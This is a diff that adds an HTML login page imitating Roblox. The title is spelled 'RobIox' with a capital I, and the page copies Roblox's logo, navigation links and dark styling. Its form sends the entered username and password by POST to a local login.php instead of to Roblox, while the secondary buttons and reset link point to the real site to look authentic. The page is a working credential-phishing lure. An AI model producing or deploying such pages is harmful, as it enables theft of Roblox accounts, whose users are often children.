@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Log In To RobIox</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #0d0d0d;
+      color: white;
+    }
+
+    /* === Navbar === */
+    .navbar {
+      background-color: #1a1a1a;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #333;
+    }
+
+    .nav-left, .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .nav-left img {
+      height: 32px;
+    }
+
+    .nav-link {
+      color: white;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: bold;
+      transition: color 0.3s;
+    }
+
+    .nav-link:hover {
+      color: #0af;
+    }
+
+    .robux {
+      background-color: #2a2a2a;
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    /* === Login Form === */
+    .main {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: calc(100vh - 60px);
+    }
+
+    .login-container {
+      background-color: #1c1c1c;
+      width: 400px;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.6);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      background-color: #2a2a2a;
+      border: 1px solid #444;
+      border-radius: 4px;
+      color: white;
+      font-size: 16px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      background-color: #2a2a2a;
+      border: 1px solid white;
+      border-radius: 4px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #333;
+    }
+
+    .link-text {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .link-text a {
+      color: white;
+      text-decoration: none;
+    }
+
+    .divider {
+      border-top: 1px solid #444;
+      margin: 20px 0;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ✅ Top Navbar -->
+  <div class="navbar">
+    <div class="nav-left">
+      <a href="https://www.roblox.com"><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTYiIGhlaWdodD0iNTYiIHZpZXdCb3g9IjAgMCA1NiA1NiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTExLjY3NjMgMEwwIDQ0LjE2NTlMNDMuNTc3MSA1Nkw1NS4yNTMzIDExLjgzNDFMMTEuNjc2MyAwWk0zMi4wODQ5IDM1LjgyN0wxOS45MDc5IDMyLjUxODVMMjMuMTcyMyAyMC4xNzY5TDM1LjM1NDIgMjMuNDg1NUwzMi4wODQ5IDM1LjgyN1oiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" alt="Roblox Logo" /></a>
+      <a class="nav-link" href="https://www.roblox.com/charts#/?device=computer&country=all">Charts</a>
+      <a class="nav-link" href="https://www.roblox.com/catalog?Category=1&salesTypeFilter=1">Marketplace</a>
+      <a class="nav-link" href="https://create.roblox.com/landing">Create</a>
+      <a class="nav-link" href="https://www.roblox.com/upgrades/robux?ctx=navpopover">Robux</a>
+    </div>
+    <div class="nav-right">
+      <div class="robux">💰 0</div>
+    </div>
+  </div>
+
+  <!-- ✅ Main Login Form -->
+  <div class="main">
+    <form class="login-container" action="login.php" method="POST">
+      <h2>Login to Roblox</h2>
+      <input type="text" name="username" placeholder="Username/Email/Phone" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button class="btn" type="submit">Log In</button>
+
+      <div class="link-text">
+        <a href="https://www.roblox.com/Login/ResetPasswordRequest.aspx" target="_blank">Forgot Password or Username?</a>
+      </div>
+
+      <div class="divider"></div>
+
+      <button class="btn" type="button" onclick="window.location.href='https://www.roblox.com/login'">Email Me a One-Time Code</button>
+      <button class="btn" type="button" onclick="window.location.href='https://www.roblox.com/login'">Use Another Device</button>
+
+      <div class="link-text">
+        Don’t have an account? <a href="signup.html">Sign Up</a>
+      </div>
+    </form>
+  </div>
+</body>
+</html>
